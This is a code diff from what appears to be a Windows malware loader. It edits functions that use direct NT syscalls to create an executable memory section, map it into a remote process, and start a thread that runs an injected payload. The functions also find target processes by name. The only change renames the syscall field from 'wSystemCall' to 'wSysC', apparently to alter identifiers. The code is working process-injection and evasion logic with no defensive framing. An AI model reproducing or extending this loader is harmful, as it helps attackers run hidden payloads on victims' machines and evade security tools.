@@ -138,7 +138,7 @@ BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN
 
 	//--------------------------------------------------------------------------
 	// Allocating local map view
-	ConfS(g_Sys.NtCreateSection.wSystemCall);
+	ConfS(g_Sys.NtCreateSection.wSysC);
 	if ((STATUS = RunSys(&hSection, SECTION_ALL_ACCESS, NULL, &MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0) {
 #if DEBUG
 		PRINTA("[!] NtCreateSection Failed With Error : 0x%0.8X \n", STATUS);
@@ -150,7 +150,7 @@ BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN
 		dwLocalFlag = PAGE_EXECUTE_READWRITE;
 	}
 
-	ConfS(g_Sys.NtMapViewOfSection.wSystemCall);
+	ConfS(g_Sys.NtMapViewOfSection.wSysC);
 	if ((STATUS = RunSys(hSection, (HANDLE)-1, &pLocalAddress, NULL, NULL, NULL, &sViewSize, 1, NULL, dwLocalFlag)) != 0) {
 #if DEBUG
 		PRINTA("[!] NtMapViewOfSection [L] Failed With Error : 0x%0.8X \n", STATUS);
@@ -174,7 +174,7 @@ BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN
 		// Allocating remote map view
 	if (!bLocal) {
 
-		ConfS(g_Sys.NtMapViewOfSection.wSystemCall);
+		ConfS(g_Sys.NtMapViewOfSection.wSysC);
 		if ((STATUS = RunSys(hSection, hProcess, &pRemoteAddress, NULL, NULL, NULL, &sViewSize, 1, NULL, PAGE_EXECUTE_READWRITE)) != 0) {
 #if DEBUG
 			PRINTA("[!] NtMapViewOfSection [R] Failed With Error : 0x%0.8X \n", STATUS);
@@ -197,7 +197,7 @@ BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN
 #if DEBUG
 	PRINTA("\t[i] Running Thread Of Entry 0x%p ... ", pExecAddress);
 #endif
-	ConfS(g_Sys.NtCreateThreadEx.wSystemCall);
+	ConfS(g_Sys.NtCreateThreadEx.wSysC);
 	if ((STATUS = RunSys(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pExecAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
 #if DEBUG
 		PRINTA("[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n", STATUS);
@@ -210,7 +210,7 @@ BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN
 #endif
 	//--------------------------------------------------------------------------
 	// Waiting for the thread to finish
-	ConfS(g_Sys.NtWaitForSingleObject.wSystemCall);
+	ConfS(g_Sys.NtWaitForSingleObject.wSysC);
 	if ((STATUS = RunSys(hThread, FALSE, NULL)) != 0) {
 #if DEBUG
 		PRINTA("[!] NtWaitForSingleObject Failed With Error : 0x%0.8X \n", STATUS);
@@ -219,7 +219,7 @@ BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN
 	}
 
 	// Unmapping the local view
-	ConfS(g_Sys.NtUnmapViewOfSection.wSystemCall);
+	ConfS(g_Sys.NtUnmapViewOfSection.wSysC);
 	if ((STATUS = RunSys((HANDLE)-1, pLocalAddress)) != 0) {
 #if DEBUG
 		PRINTA("[!] NtUnmapViewOfSection Failed With Error : 0x%0.8X \n", STATUS);
@@ -228,7 +228,7 @@ BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN
 	}
 
 	// Closing the section handle
-	ConfS(g_Sys.NtClose.wSystemCall);
+	ConfS(g_Sys.NtClose.wSysC);
 	if ((STATUS = RunSys(hSection)) != 0) {
 #if DEBUG
 		PRINTA("[!] NtClose Failed With Error : 0x%0.8X \n", STATUS);
@@ -248,7 +248,7 @@ BOOL GetRemoteProcessHandle(LPCWSTR szProcName, DWORD* pdwPid, HANDLE* phProcess
 	NTSTATUS				    STATUS = NULL;
 
 	// This will fail with status = STATUS_INFO_LENGTH_MISMATCH, but that's ok, because we need to know how much to allocate (uReturnLen1)
-	ConfS(g_Sys.NtQuerySystemInformation.wSystemCall);
+	ConfS(g_Sys.NtQuerySystemInformation.wSysC);
 	RunSys(SystemProcessInformation, NULL, NULL, &uReturnLen1);
 
 	// Allocating enough buffer for the returned array of `SYSTEM_PROCESS_INFORMATION` struct
@@ -261,7 +261,7 @@ BOOL GetRemoteProcessHandle(LPCWSTR szProcName, DWORD* pdwPid, HANDLE* phProcess
 	pValueToFree = SystemProcInfo;
 
 	// Calling NtQuerySystemInformation with the right arguments, the output will be saved to 'SystemProcInfo'
-	ConfS(g_Sys.NtQuerySystemInformation.wSystemCall);
+	ConfS(g_Sys.NtQuerySystemInformation.wSysC);
 	STATUS = RunSys(SystemProcessInformation, SystemProcInfo, uReturnLen1, &uReturnLen2);
 	if (STATUS != 0x0) {
 #if DEBUG
